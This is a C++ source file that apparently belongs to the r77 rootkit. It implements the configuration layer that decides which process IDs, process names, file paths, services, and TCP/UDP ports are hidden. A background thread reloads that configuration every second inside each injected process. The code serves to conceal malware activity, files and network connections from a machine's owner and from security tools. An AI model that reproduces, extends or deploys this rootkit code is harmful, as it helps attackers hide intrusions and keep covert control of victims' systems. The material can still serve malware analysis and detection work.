#include "r77.h"

HANDLE Config::Thread = NULL;
PR77_CONFIG Config::Configuration = NULL;

void Config::Initialize()
{
	// The configuration is read periodically in a background thread.
	if (!Thread)
	{
		Thread = CreateThread(NULL, 0, UpdateThread, NULL, 0, NULL);
	}
}
void Config::Shutdown()
{
	if (Thread)
	{
		TerminateThread(Thread, 0);
		Thread = NULL;
	}
}

bool Config::IsProcessIdHidden(DWORD processId)
{
	return Configuration && IntegerListContains(Configuration->HiddenProcessIds, processId);
}
bool Config::IsProcessNameHidden(LPCWSTR name)
{
	return Configuration && StringListContains(Configuration->HiddenProcessNames, name);
}
bool Config::IsProcessNameHidden(UNICODE_STRING name)
{
	PWCHAR chars = ConvertUnicodeStringToString(name);
	if (chars)
	{
		bool result = IsProcessNameHidden(chars);
		delete[] chars;
		return result;
	}
	else
	{
		return false;
	}
}
bool Config::IsPathHidden(LPCWSTR path)
{
	return Configuration && StringListContains(Configuration->HiddenPaths, path);
}
bool Config::IsServiceNameHidden(LPCWSTR name)
{
	return Configuration && StringListContains(Configuration->HiddenServiceNames, name);
}
bool Config::IsTcpLocalPortHidden(USHORT port)
{
	return Configuration && IntegerListContains(Configuration->HiddenTcpLocalPorts, port);
}
bool Config::IsTcpRemotePortHidden(USHORT port)
{
	return Configuration && IntegerListContains(Configuration->HiddenTcpRemotePorts, port);
}
bool Config::IsUdpPortHidden(USHORT port)
{
	return Configuration && IntegerListContains(Configuration->HiddenUdpPorts, port);
}

DWORD WINAPI Config::UpdateThread(LPVOID parameter)
{
	Configuration = LoadR77Config();

	while (true)
	{
		// Interval should not be too small, because this thread is running in every injected process.
		Sleep(1000);

		PR77_CONFIG newConfiguration = LoadR77Config();

		if (CompareR77Config(Configuration, newConfiguration))
		{
			// Configuration hasn't changed.
			DeleteR77Config(newConfiguration);
		}
		else
		{
			// Store configuration only if it has changed to avoid threading errors.
			PR77_CONFIG oldConfiguration = Configuration;
			Configuration = newConfiguration;
			DeleteR77Config(oldConfiguration);
		}
	}

	return 0;
}